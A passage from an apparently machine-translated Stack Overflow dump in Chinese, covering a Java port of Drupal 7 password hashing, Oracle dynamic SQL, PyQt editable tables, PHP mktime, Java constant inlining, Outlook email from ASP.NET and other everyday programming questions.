'���Y�emb
ӈ3����4��q���h�osab��V�!IS�uC�*[� 
```

如您所见，几乎相同....

```
php:  ӈ3����4��q����h�osab��V�!IS�uC�*[�
java: ӈ3����4��q���h�osab��V�!IS�uC�*[� 
```

有人知道如何修复最后一部分吗？形式 new String(SHA512(salt + password,'Whatevercodec')); 没有帮助我...谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-11T14:13:58.963

我建议你做这样的事情：

```
import java.security.NoSuchAlgorithmException;

public class hash {

private static final int DRUPAL_HASH_LENGTH = 55;

private static String _password_itoa64() {
    return "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
}

public static void main(String args[]) throws Exception {
    // Passwords and hashes generated by Drupal.
    checkPassword("adrian", "$S$DNbBTrkalsPChLsqajHUQS18pBBxzSTQW0310SzivTy7HDQ.zgyG");
    checkPassword("test"  , "$S$DxVn7wubSRzoK9X2pkGx4njeDRkLEgdqPphc2ZXkkb8Viy8JEGf3");
    checkPassword("barbaz", "$S$DOASeKfBzZoqgSRl/mBnK06GlLESyMHZ81jyUueEBiCrkkxxArpR");
}

private static int password_get_count_log2(String setting) {
    return _password_itoa64().indexOf(setting.charAt(3));
}

private static byte[] sha512(String input) {
    try {
        return java.security.MessageDigest.getInstance("SHA-512").digest(input.getBytes());
    } catch (NoSuchAlgorithmException ex) {
        ex.printStackTrace();
    }
    return new byte[0];
}

private static byte[] sha512(byte[] input) {
    try {
        return java.security.MessageDigest.getInstance("SHA-512").digest(input);
    } catch (NoSuchAlgorithmException ex) {
        ex.printStackTrace();
    }
    return new byte[0];
}

/**
 * Note: taken from the default Drupal 7 password algorithm
 *
 * @param candidate               the clear text password
 * @param saltedEncryptedPassword the salted encrypted password string to check => NEEDS TO BE THE DEFAULT DRUPAL 7 PASSWORD HASH.
 * @return true if the candidate matches, false otherwise.
 */
public static boolean checkPassword(String candidate, String saltedEncryptedPassword) throws Exception {
    if (candidate == null || saltedEncryptedPassword == null) {
        return false;
    }

    String hash = password_crypt(candidate, saltedEncryptedPassword);
    System.out.println("Expected value = " + saltedEncryptedPassword);
    System.out.println("Calced   value = " + hash);
    System.out.println("Result Good?   = " + saltedEncryptedPassword.equalsIgnoreCase(hash));

    return saltedEncryptedPassword.equalsIgnoreCase(hash);
}

private static String password_crypt(String password, String passwordHash) throws Exception {
    // The first 12 characters of an existing hash are its setting string.
    passwordHash = passwordHash.substring(0, 12);
    int count_log2 = password_get_count_log2(passwordHash);
    String salt = passwordHash.substring(4, 12);
    // Hashes must have an 8 character salt.
    if (salt.length() != 8) {
        return null;
    }

    int count = 1 << count_log2;

    byte[] hash;
    try {
        hash = sha512(salt.concat(password));

        do {
            hash = sha512(joinBytes(hash, password.getBytes("UTF-8")));
        } while (--count > 0);
    } catch (Exception e) {
        System.out.println("error " + e.toString());
        return null;
    }

    String output = passwordHash + _password_base64_encode(hash, hash.length);
    return (output.length() > 0) ? output.substring(0, DRUPAL_HASH_LENGTH) : null;
}

private static byte[] joinBytes(byte[] a, byte[] b) {
    byte[] combined = new byte[a.length + b.length];

    System.arraycopy(a, 0, combined, 0, a.length);
    System.arraycopy(b, 0, combined, a.length, b.length);
    return combined;
}

private static String _password_base64_encode(byte[] input, int count) throws Exception {

    StringBuffer output = new StringBuffer();
    int i = 0;
    CharSequence itoa64 = _password_itoa64();
    do {
        long value = SignedByteToUnsignedLong(input[i++]);

        output.append(itoa64.charAt((int) value & 0x3f));
        if (i < count) {
            value |= SignedByteToUnsignedLong(input[i]) << 8;
        }
        output.append(itoa64.charAt((int) (value >> 6) & 0x3f));
        if (i++ >= count) {
            break;
        }
        if (i < count) {
            value |=  SignedByteToUnsignedLong(input[i]) << 16;
        }

        output.append(itoa64.charAt((int) (value >> 12) & 0x3f));
        if (i++ >= count) {
            break;
        }
        output.append(itoa64.charAt((int) (value >> 18) & 0x3f));
    } while (i < count);

    return output.toString();
}

public static long SignedByteToUnsignedLong(byte b) {
    return b & 0xFF;
}

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-09-13T23:44:00.553

感谢 Adrian 提供的出色代码。你为我节省了很多时间！我只是想发布一个不压制异常、删除 main() 和控制台输出以及正确命名的 Java 函数的后续内容。单元测试也随之而来。

```
import java.io.UnsupportedEncodingException;
import java.security.NoSuchAlgorithmException;

public class PhpassHashedPassword {

    private static final int DRUPAL_HASH_LENGTH = 55;

    private static final String ITOA_64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

    private static int passwordGetCount(String setting) {
        return ITOA_64.indexOf(setting.charAt(3));
    }

    private static byte[] sha512(byte[] input) throws NoSuchAlgorithmException {
        return java.security.MessageDigest.getInstance("SHA-512").digest(input);
    }

    /**
     * Note: taken from the default Drupal 7 password algorithm
     *
     * @param candidate the clear text password
     * @param saltedEncryptedPassword the salted encrypted password string to
     * check => NEEDS TO BE THE DEFAULT DRUPAL 7 PASSWORD HASH.
     * @return true if the candidate matches, false otherwise.
     * @throws java.security.NoSuchAlgorithmException
     * @throws java.io.UnsupportedEncodingException
     */
    public static boolean validatePasswordHash(String candidate, String saltedEncryptedPassword) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        if (candidate == null || saltedEncryptedPassword == null) {
            return false;
        }

        String hash = password_crypt(candidate, saltedEncryptedPassword);
        return saltedEncryptedPassword.equalsIgnoreCase(hash);
    }

    private static String password_crypt(String password, String passwordHash) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        // The first 12 characters of an existing hash are its setting string.
        passwordHash = passwordHash.substring(0, 12);
        int count_log2 = passwordGetCount(passwordHash);
        String salt = passwordHash.substring(4, 12);
        // Hashes must have an 8 character salt.
        if (salt.length() != 8) {
            return null;
        }

        int count = 1 << count_log2;

        byte[] hash = sha512(salt.concat(password).getBytes());

        do {
            hash = sha512(joinBytes(hash, password.getBytes("UTF-8")));
        } while (--count > 0);

        String output = passwordHash + passwordBase64Encode(hash, hash.length);
        return (output.length() > 0) ? output.substring(0, DRUPAL_HASH_LENGTH) : null;
    }

    private static byte[] joinBytes(byte[] a, byte[] b) {
        byte[] combined = new byte[a.length + b.length];

        System.arraycopy(a, 0, combined, 0, a.length);
        System.arraycopy(b, 0, combined, a.length, b.length);
        return combined;
    }

    private static String passwordBase64Encode(byte[] input, int count) {

        StringBuilder output = new StringBuilder();
        int i = 0;
        do {
            long value = signedByteToUnsignedLong(input[i++]);

            output.append(ITOA_64.charAt((int) value & 0x3f));
            if (i < count) {
                value |= signedByteToUnsignedLong(input[i]) << 8;
            }
            output.append(ITOA_64.charAt((int) (value >> 6) & 0x3f));
            if (i++ >= count) {
                break;
            }
            if (i < count) {
                value |= signedByteToUnsignedLong(input[i]) << 16;
            }

            output.append(ITOA_64.charAt((int) (value >> 12) & 0x3f));
            if (i++ >= count) {
                break;
            }
            output.append(ITOA_64.charAt((int) (value >> 18) & 0x3f));
        } while (i < count);

        return output.toString();
    }

    private static long signedByteToUnsignedLong(byte b) {
        return b & 0xFF;
    }

} 
```

这是一个单元测试：

```
public class PhpassHashedPasswordTest {

    public PhpassHashedPasswordTest() {
    }

    @BeforeClass
    public static void setUpClass() {
    }

    @AfterClass
    public static void tearDownClass() {
    }

    @Before
    public void setUp() {
    }

    @After
    public void tearDown() {
    }

    @org.junit.Test
    public void testGoodPassword() throws NoSuchAlgorithmException, UnsupportedEncodingException {
        if(!PhpassHashedPassword.validatePasswordHash("Y0dog!", "$S$EU44gErBh91wY1I8eEfEyymUNfFqh8OXLYeAdm.1xVnjgkN9KauF")) {
            fail("expected password to match");
        }
    }

    @org.junit.Test
    public void testMismatchPassword() throws NoSuchAlgorithmException, UnsupportedEncodingException {
        if(PhpassHashedPassword.validatePasswordHash("THEWRONGPASSWORD", "$S$EU44gErBh91wY1I8eEfEyymUNfFqh8OXLYeAdm.1xVnjgkN9KauF")) {
            fail("expected password match to fail");
        }
    }

} 
```

# oracle10g - 查询块插入到Oracle中具有相似名称（table1，表2）和相同列名的5个以上表中

> ID：11736557
> 
> 赞同：0
> 
> 时间：2012-07-31T09:00:31.957
> 
> 标签：oracle10g

```
`IN_Table_Num Number:=4;
IF IN_Table_Num >3 and IN_Table_Num <100 Then 
Insert Into Table||IN_Table_Num
()Values()
End IF;` 
```

我有表名称，如表 1、表 2 到表 9，具有相同的列名（ID、名称、优先级）现在我想根据传递的数字插入/更新到表中。例如，如果传递的数字是 2，它应该将数据插入或更新到 Table2，如果数字是 3，它应该插入/更新到 Table3。请同样回答

我想连接表名以生成 Table4 到 9 并在传递 IN_Table_Num 时插入。Table4到Table9的列名都相同

请解释

请帮忙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T12:22:11.433

您可以为此目的使用动态 SQL（请参阅[http://docs.oracle.com/cd/E14072_01/appdev.112/e10472/dynamic.htm](http://docs.oracle.com/cd/E14072_01/appdev.112/e10472/dynamic.htm)以供参考）。您几乎可以为您的插入语句构建一个字符串，您可以通过将名称存根与数字连接来创建表名，然后`EXECUTE IMMEDIATE`对其进行操作。

# python - 使用 QAbstractTableModel 在 pyqt 中编辑表

> ID：11736560
> 
> 赞同：8
> 
> 时间：2012-07-31T09:00:43.403
> 
> 标签：python, user-interface, pyqt4, pyside, qabstracttablemodel

我正在尝试在 PyQt 中创建一个可编辑的表。这是仅显示表格的代码：

```
import sys
from PyQt4 import QtGui, QtCore
from PyQt4.QtCore import *
from PyQt4.QtGui import *

# données à représenter
my_array = [['00','01','02'],
            ['10','11','12'],
            ['20','21','22']]

def main():
    app = QApplication(sys.argv)
    w = MyWindow()
    w.show()
    sys.exit(app.exec_())

# création de la vue et du conteneur
class MyWindow(QWidget):
    def __init__(self, *args):
        QWidget.__init__(self, *args)

        tablemodel = MyTableModel(my_array, self)
        tableview = QTableView()
        tableview.setModel(tablemodel)

        layout = QVBoxLayout(self)
        layout.addWidget(tableview)
        self.setLayout(layout)

# création du modèle
class MyTableModel(QAbstractTableModel):
    def __init__(self, datain, parent = None, *args):
        QAbstractTableModel.__init__(self, parent, *args)
        self.arraydata = datain

    def rowCount(self, parent):
        return len(self.arraydata)

    def columnCount(self, parent):
        return len(self.arraydata[0])

    def data(self, index, role):
        if not index.isValid():
            return None
        elif role != Qt.DisplayRole:
            return None
        return (self.arraydata[index.row()][index.column()])

    """
    def setData(self, index, value):
        self.arraydata[index.row()][index.column()] = value
        return True
    def flags(self, index):
        return Qt.ItemIsEditable
    """    

if __name__ == "__main__":
    main() 
```

如果我实现方法`setData`and `flags`，所有项目甚至都无法选择...使表格可编辑的解决方案是什么？谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T09:26:11.933

我刚刚找到了解决方案，在标志方法中需要返回值`QtCore.Qt.ItemIsEditable | QtCore.Qt.ItemIsEnabled | QtCore.Qt.ItemIsSelectable`

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2015-05-22T22:58:10.423

```
OR Override
Qt::ItemFlags MyTableView::flags(const QModelIndex& index) const
{
    Qt::ItemFlags flags = QAbstractTableModel::flags(index);
    flags |= Qt::ItemIsEditable;
    return flags;
} 
```

# android - 使用 EasyTracker 跟踪 Android 活动

> ID：11736563
> 
> 赞同：0
> 
> 时间：2012-07-31T09:00:46.980
> 
> 标签：android, eclipse, android-activity

我想使用 EasyTracker 在我的应用程序中实施活动跟踪
我有[这个链接寻求帮助](https://developers.google.com/analytics/devguides/collection/android/v2/campaigns#general-tracking)
我不明白我是如何得到`EasyTracker.getInstance()`
的 我必须在我的项目中添加一些 Jar 吗？获取 EasyTracker 实例
如果是这样，请告诉我从哪里可以得到那个 jar？
我`EasyTrackerSrcAndroid_1.0.zip`从[这个链接](http://code.google.com/p/analytics-api-samples/downloads/detail?name=EasyTrackerSrcAndroid_1.0.zip&can=2&q=)
中找到了源代码 但是这个代码不像上面链接中提到的那样工作，我正在寻求帮助。
比如这个代码有`EasyTracker.getInstance().setContext(this);`and`EasyTracker.getInstance().activityStart`和`EasyTracker.getInstance().activityStop`and `EasyTracker.getTracker().setCampaign(uri.getPath())`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-09T10:52:30.093

我有同样的问题。解决方案：

从您的项目中删除 EasyTracker.jar。自从新的分析 v2 api 出现以来，您将不再需要它。将 libgoogleanalyticsv2.jar 库添加到您的 libs 文件夹并将其添加到您的项目构建路径中。

你准备好了！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:15:30.857

[http://dl.dropbox.com/u/4693469/EasyTracker.jar](http://dl.dropbox.com/u/4693469/EasyTracker.jar)

# php - 使用 mktime() 获取月份时出错

> ID：11736566
> 
> 赞同：-2
> 
> 时间：2012-07-31T09:00:57.873
> 
> 标签：php, date

我正在尝试使用`date`.

```
$year= 2012;
$mon = date( 'F', mktime(0, 0, 0, $month,$year) ); 
```

在上面的代码片段中，`$month`是动态递增的。我用了一个while循环`$month++`。但它没有给我正确的日期。

例如，假设我`$month=5`在开始时给了，然后它会递增直到`$month=12`。那么输出应该是这样的

```
May
June
July... 
```

但是，它的输出是：

```
November
December
January..... 
```

为什么是这样？我在这里做错什么了吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-31T09:05:21.440

您忘记了 $date 参数。mktime 的正确语法是

```
mktime($hour,$minute,$second,$month,$day,$year); 
```

所以在你的例子中 $year 将被视为“日期”

尝试类似的东西

```
mktime(0,0,0,$month,1,$year); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T09:05:38.083

有一个错误`mktime`：应该是`mktime(0, 0, 0, $month, 1,$year)`，因为第 5 个参数是`day`，但不是`year`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-31T09:13:27.343

您的问题源于以下几行：

```
$year= 2012;
$mon = date( 'F', mktime(0, 0, 0, $month,$year) ); 
```

确切地说来自 mktime 命令。确切的语法是： mktime($hour,$minute,$second,$month,$day,$year);

由于您将 $year 作为第 5 个参数，它被解释为“day”而不是“year”。因此，当您将月份设置为 5 时，您会得到第 5 个月 +2012 天，这意味着 5 月的第一天会增加 2011 天，结果是 11 月。

您应该使用以下行来获得所需的结果：

```
$mon = date( 'F', mktime(0, 0, 0, $month,1,$year) ); 
```

这样您就可以获得所需的月份（并且这一天始终是本月的第一天......所以它不会干扰您的计算。

# c - 关于字符串文字和数组元素数的一些结论，请给出您的意见

> ID：11736577
> 
> 赞同：0
> 
> 时间：2012-07-31T09:01:53.863
> 
> 标签：c

从我写的以下代码：

```
#define ELEMENTS_NUMBER_OF(array) (sizeof(array) / sizeof(array[0]))

printf("\"abcdef\"[0]: %c\n", "abcdef"[0]);
printf("elements number of \"abcdef\" is %d\n", ELEMENTS_NUMBER_OF("abcdef")); 
```

我得出的结论是：

1.  字符串文字`"abcdef"`是一个`char`数组；
2.  `sizeof(a)/sizeof(a[0])`可用于计算任何类型的数组长度。

我对吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:54:04.610

1.  是的，`"abcdef"`将存储在数组中的类型`char`元素和静态存储持续时间。
2.  如果`a`是一个数组（甚至是 VLA），`sizeof(a)/sizeof(a[0])`则计算`a`. `sizeof a`产生数组的长度`a`，以字节为单位。请注意，如果`a`是指向动态分配内存的指针，`sizeof`将产生指针类型大小，并且当应用于声明为数组类型的参数时，会产生相应指针类型`sizeof`的大小。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:07:08.347

1.  是的，如果你写“ABC”，它可以被视为一个字符串，其中每个字符都可以通过索引访问，尽管它不是很漂亮。

2.  如果“array”是一个数组，那么是的，它将返回元素的数量，但是它的参数是一个指针，它不会返回正确的值，因为 sizeof 将返回指针的大小而不是数组的大小。

# java - 在Java中声明一个静态常量会影响编译的类

> ID：11736580
> 
> 赞同：1
> 
> 时间：2012-07-31T09:02:06.200
> 
> 标签：java, static, constants

好的，这是我的疑问...

我有一个带有一些类的blazeDS（tomcat）应用程序，每个类都使用`Config`and`DB`类进行配置和数据库连接......

这是一个例子

`Config`班级

```
public class Config {
    public static final String DBClass = "oracle.jdbc.driver.OracleDriver";
    public static final String ConnectString = "jdbc:oracle:thin:@//127.0.0.1:1521/xe";
    public static final String UserDB = "user";
    public static final String PasswordDB = "pass"; 
} 
```

`DB`班级

```
public class DB
{       
    public DB() {}

    public static Connection dbConnect(Connection c)
    {
                try
                {      if (c == null || c.isClosed()){                                  
                            Class.forName(Config.DBClass);
                            c = DriverManager.getConnection(Config.ConnectString,Config.UserDB,Config.PasswordDB);
                        }
                return c;                        
                }
                catch (Exception e)
                {
                        System.out.println(e.getMessage());
                        return null;
                }
    }

    public static void closeConnection(Connection connection) throws SQLException
    {
        if (!connection.isClosed())
            connection.close();
    }
} 
```

我有一个测试和生产环境，每个数据库访问具有不同的用户/密码。我注意到当使用测试类更新生产文件时（我不覆盖`Config.class`），我从数据库中收到错误...

那么，`static final`编译版本中的值（用户/密码）是否直接保存在类本身中（在我的情况下为 DB.class）？？？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T09:12:32.460

简而言之，是的。

[Java 规范](http://docs.oracle.com/javase/specs/jls/se7/jls7.pdf)的摘录：

> “对作为常量变量的字段（第 4.12.4 节）的引用在编译时解析为表示的常量值。二进制文件的代码中不应存在对此类字段的引用（类或包含该字段的接口，该字段将具有初始化它的代码）。此类字段必须始终看起来已初始化（第 12.4.2 节）；不得观察此类字段类型的默认初始值。请参阅第 13.4 节.9 进行讨论。” （第 339 页）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:09:09.657

> 那么，编译版本中的静态最终值（用户/通行证）是否直接保存在类本身中（在我的情况下为 DB.class）？？？

是的，任何最终变量都被字节码中的字面值替换。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:19:04.527

作为“编译时常量”的静态最终变量（常量）在其目的地内联。

so if you use the constant in several classes those classes are affected. if you for some reason don't deploy all the affected classes bad things happen and your old values are still used.

# java - 该集合只添加到，从不阅读

> ID：11736582
> 
> 赞同：3
> 
> 时间：2012-07-31T09:02:14.243
> 
> 标签：java, jpa, netbeans, collections, persistence

Netbeans 给出： 为以下声明配置“不平衡读/写与集合” `headerFields`：

```
package net.bounceme.dur.usenet.model;

import java.io.Serializable;
import java.util.AbstractMap.SimpleEntry;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.mail.Header;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.persistence.*;

@Entity
public class Article implements Serializable {

    private static final long serialVersionUID = 1L;
    private static final Logger LOG = Logger.getLogger(Article.class.getName());
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    @Column
    private String subject;
    @OneToMany(mappedBy = "article")
    private List<HeaderField> headerFields = new ArrayList<>();

    public Article() {
    }

    public Article(Message message) {
        try {
            subject = message.getSubject();
            Enumeration e = message.getAllHeaders();

            while (e.hasMoreElements()) {
                Header header = (Header) e.nextElement();
                @SuppressWarnings("unchecked")
                SimpleEntry nameValue = new SimpleEntry(header.getName(), header.getValue());
                HeaderField headerField = new HeaderField(nameValue);
                headerFields.add(headerField);
            }
        } catch (MessagingException ex) {
            Logger.getLogger(Article.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }

    @Override
    public int hashCode() {
        int hash = 0;
        hash += (id != null ? id.hashCode() : 0);
        return hash;
    }

    @Override
    public boolean equals(Object object) {
        // TODO: Warning - this method won't work in the case the id fields are not set
        if (!(object instanceof Article)) {
            return false;
        }
        Article other = (Article) object;
        if ((this.id == null && other.id != null) || (this.id != null && !this.id.equals(other.id))) {
            return false;
        }
        return true;
    }

    @Override
    public String toString() {
        return subject;
    }

    public String getSubject() {
        return subject;
    }

    public void setSubject(String subject) {
        this.subject = subject;
    }
} 
```

这让我质疑与 HeaderField 的关系是否从 正确建立`Article`，或者此警告表示什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:15:16.470

由于您使用的是 JPA 注释类，其私有字段将通过反射读取，因此此警告不合适，您应该简单地禁用它。它只是指您的私有列表没有通过任何方法公开，并且类中的代码从不读取其内容的事实。

# jquery - 如何在卸载绑定表单元素之前访问 jquery？

> ID：11736583
> 
> 赞同：1
> 
> 时间：2012-07-31T09:02:28.300
> 
> 标签：jquery, forms, onbeforeunload

如果未发布表单，我正在使用 jQuery 显示消息，使用以下技术：

```
$(window).bind("beforeunload", function()
{
    form = ... // how to access the submitted $("#form")?
    // here is code to check if form values have changed
    return "Are you sure you want to leave this page without saving (submitting the form)?"
} 
```

由于 $(this) 显然是窗口元素，我怎样才能找出页面上试图提交的表单（如果提交了表单）？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:06:24.770

我建议不要绑定到`beforeunload`- 即使他们**不**尝试提交表单也会触发 - 您而是使用绑定到`submit`表单事件的确认对话框。

像这样的东西：

```
$('form').submit(function(e) {
    if(!confirm('Are you sure you want to submit the form?'))
        e.preventDefault();
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:07:25.457

不知道如何按照自己的方式进行。我会改写提交：

```
$('form').submit(function() {
         // display message and return false if they answer 'cancel'
}); 
```

# google-chrome-extension - Chrome 实验性 USB api 找不到任何连接的设备

> ID：11736587
> 
> 赞同：3
> 
> 时间：2012-07-31T09:02:40.883
> 
> 标签：google-chrome-extension, google-chrome-app

我想使用 USB 实验 api 开发一个 chrome 扩展。我从来没有设法找到我的 USB 设备已连接。我对这个扩展的起点是这个代码： [旋钮示例](https://github.com/GoogleChrome/chrome-app-samples/tree/master/usb/knob) 我更改了 vid 和 pid 以匹配我的 USB 设备，但没有任何成功。我在 Windows 上尝试了 canary 和 dev 通道。

看到我没有结果，我将清单修改为：

```
{
    "name": "USB Spinner",
    "version": "0.1",
    "manifest_version": 2,
    "app": {
        "background": {
            "scripts": ["background.js"]
        }
    },
    "permissions": [
        "app.window",
        "experimental",
        "usb"
    ]
} 
```

我在权限中添加了实验性的 ans usb 字段。但仍然没有结果。

我访问 USB 设备的代码是：

```
var VENDOR_ID = 0x1234;
var PRODUCT_ID = 0x0006;

var usb = chrome.experimental.usb;

var deviceOptions = {
    onEvent: function(usbEvent) {
    }
};

usb.findDevice(
    VENDOR_ID,
    PRODUCT_ID,
    deviceOptions,
    function(device) {
        if (!device) {
            console.log('device not found');
            return;
        }
        console.log('Found device: ' + device.handle);
    }
); 
```

任何帮助将非常感激。

我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-06T17:29:48.417

As mangini says, `chrome.usb` cannot access HID-class devices because the underlying operating system acquires them before that API implementation gets a chance. Fortunately, we're fixing that. Follow [the tracking bug for adding USB HID support](https://code.google.com/p/chromium/issues/detail?id=305300) and please provide feedback on the suitability of the API and the quality of the implementation.

# java - Java Android，在对象方法/函数上放置提示/描述

> ID：11736589
> 
> 赞同：0
> 
> 时间：2012-07-31T09:02:42.600
> 
> 标签：java

作为标题，我将如何在对象上放置提示或描述，以便如果用户将鼠标悬停在方法或对象上，他们将获得类似于具有解释的标准对象库的描述。我到处搜索，但找不到示例。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-31T09:05:28.357

您需要使用 JavaDoc 注释，例如：

```
/**
 * This method returns the x value.
 * 
 * @return the x value
 */
public int getValue()
{
    return x;
} 
```

有关这方面的更多信息，请参阅：[如何为 Javadoc 工具编写文档注释](http://www.oracle.com/technetwork/java/javase/documentation/index-137868.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T09:05:35.167

这可以通过使用 JavaDoc 来实现。

[http://www.oracle.com/technetwork/java/javase/documentation/index-137868.html](http://www.oracle.com/technetwork/java/javase/documentation/index-137868.html)

上页示例：

```
/**
 * Returns an Image object that can then be painted on the screen. 
 * The url argument must specify an absolute {@link URL}. The name
 * argument is a specifier that is relative to the url argument. 
 * <p>
 * This method always returns immediately, whether or not the 
 * image exists. When this applet attempts to draw the image on
 * the screen, the data will be loaded. The graphics primitives 
 * that draw the image will incrementally paint on the screen. 
 *
 * @param  url  an absolute URL giving the base location of the image
 * @param  name the location of the image, relative to the url argument
 * @return      the image at the specified URL
 * @see         Image
 */
 public Image getImage(URL url, String name) {
        try {
            return getImage(new URL(url, name));
        } catch (MalformedURLException e) {
            return null;
        }
 } 
```

此外，您还需要一个支持此功能的 IDE，例如 Eclipse。

# c# - 使用 c# 从 pdf 创建缩略图 - 方向很重要

> ID：11736590
> 
> 赞同：1
> 
> 时间：2012-07-31T09:02:45.827
> 
> 标签：c#, pdf, thumbnails

我一直在尝试使用 c# 从 PDF 创建图像，我使用下面示例中的代码完美地工作

[http://homeofcox-cs.blogspot.com.au/2008/10/c-convert-pdf-to-image-format.html](http://homeofcox-cs.blogspot.com.au/2008/10/c-convert-pdf-to-image-format.html)

但是，如果 pdf 是横向的，则缩略图制作不正确（它仍然认为它是纵向的，甚至高度/宽度属性也将其显示为纵向）。

我的问题是，是否可以根据 PDF 的方向创建纵向或横向缩略图？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T10:24:01.910

这也已在[**“使用 Ghostscript 生成缩略图旋转我的横向 pdf 页面的设备大小定义”**](https://stackoverflow.com/questions/11326318/thumbnail-generation-with-ghostscript-rotates-my-device-size-definition-for-land)中进行了讨论。

看看那里 - 3 个答案中的每一个都提供了有关如何解决该问题的提示。（提示：这是您需要规避的 Ghostscript 的限制......）

# git - git 捆绑创建

> ID：11736591
> 
> 赞同：3
> 
> 时间：2012-07-31T09:02:57.423
> 
> 标签：git, git-bundle

我正在使用 git 版本 1.7.10.msysgit.1。我有一个工作目录，我从许多存储库中克隆了该目录。但是，现在我只想为一个仓库转移我的更改。如何使用 git bundle create 命令为我的工作树中的一个文件夹创建一个包？有人对此有线索吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:22:03.917

`git bundle`在分支上运行，而不是在提交或目录上运行（并且`git`不存储目录 - 仅文件）。如果您通过一系列提交添加了每个目录，请通过`git format-patch`( [http://linux.die.net/man/1/git-format-patch](http://linux.die.net/man/1/git-format-patch) ) 为它们创建一个补丁。

# asp.net - 打开 Outlook 窗口以发送电子邮件 asp.net

> ID：11736598
> 
> 赞同：1
> 
> 时间：2012-07-31T09:03:41.887
> 
> 标签：asp.net, visual-studio-2010, email, outlook

我正在使用 Visual Studio 2010 在 asp.net C# 中编写一个项目。我想编写一个函数，当用户单击一个按钮时，它会打开 Outlook 窗口以发送电子邮件。

我试过这个：

```
using Outlook = Microsoft.Office.Interop.Outlook;

Outlook.Application oApp    = new Outlook.Application ();
Outlook._MailItem oMailItem = (Outlook._MailItem)oApp.CreateItem ( Outlook.OlItemType.olMailItem );
oMailItem.To    = address;
// body, bcc etc...
oMailItem.Display ( true ); 
```

但是编译器说命名空间 Microsoft 内没有命名空间 Office。实际上，包括 Outlook 在内的 Microsoft Office 已完全安装在我的计算机中。

我应该在 Visual Studio 中包含 Office 库吗？如何解决问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T22:10:22.490

这使用 Outlook 发送预先加载了收件人、主题和正文的电子邮件。

```
<A HREF="mailto:recipient@domain.com?subject=this is the subject&body=Hi, This is the message body">send outlook email</A> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:07:24.247

如果使用`Microsoft.Office.Interop.Outlook`，则 Outlook 必须安装在服务器上（并在服务器上运行，而不是在用户计算机上运行）。

您是否尝试过使用[SmtpClient](http://msdn.microsoft.com/it-it/library/system.net.mail.smtpclient%28v=vs.80%29.aspx)？

```
 System.Net.Mail.MailMessage m = new System.Net.Mail.MailMessage();
        using (m)
        {
            //sender is set in web.config:   <smtp from="my alias &lt;mymail@mysite.com&gt;">
            m.To.Add(to);
            if (!string.IsNullOrEmpty(cc))
                m.CC.Add(cc);
            m.Subject = subject;
            m.Body = body;
            m.IsBodyHtml = isBodyHtml;
            if (!string.IsNullOrEmpty(attachmentName))
                m.Attachments.Add(new System.Net.Mail.Attachment(attachmentFile, attachmentName));

            System.Net.Mail.SmtpClient client = new System.Net.Mail.SmtpClient();
            try
            { client.Send(m); }
            catch (System.Net.Mail.SmtpException) {/*errors can happen*/ }
        } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-11T04:29:47.923

而是您尝试这样，使用 Microsoft.Office.Interop.Outlook 添加；参考

```
 Application app = new Application();
        NameSpace ns = app.GetNamespace("mapi");
        ns.Logon("Email-Id", "Password", false, true);
        MailItem message = (MailItem)app.CreateItem(OlItemType.olMailItem);
        message.To = "To-Email_ID";
        message.Subject = "A simple test message";
        message.Body = "This is a test. It should work";

        message.Attachments.Add(@"File_Path", Type.Missing, Type.Missing, Type.Missing);

        message.Send();
        ns.Logoff(); 
```

# ruby-on-rails - Rails 验证三种类型的日期格式

> ID：11736599
> 
> 赞同：0
> 
> 时间：2012-07-31T09:03:42.417
> 
> 标签：ruby-on-rails, ruby-on-rails-3, validation, customvalidator

我正在开发一个使用特殊日期格式的 Ruby on Rails 应用程序。有问题的日期格式是 Year.month.day，日期可以是：

年.月.日 年.月 年

我正在研究一种必须检查格式的验证方法，如果输入日期符合任何这些格式，则使其有效。到目前为止，我的代码是：

```
def data_format_correct
regexymd = /[0-9]{4}[.][0-9]{1,2}[.][0-9]{1,2}/
regexym = /[0-9]{4}[.][0-9]{1,2}/
regexy = /[0-9]{4}/
if :data.to_s =~ regexymd
  return true
elsif  :data.to_s =~ regexym
  return true
elsif :data.to_s =~ regexy
  return true
else
  errors.add(:data)
  return
end 
```

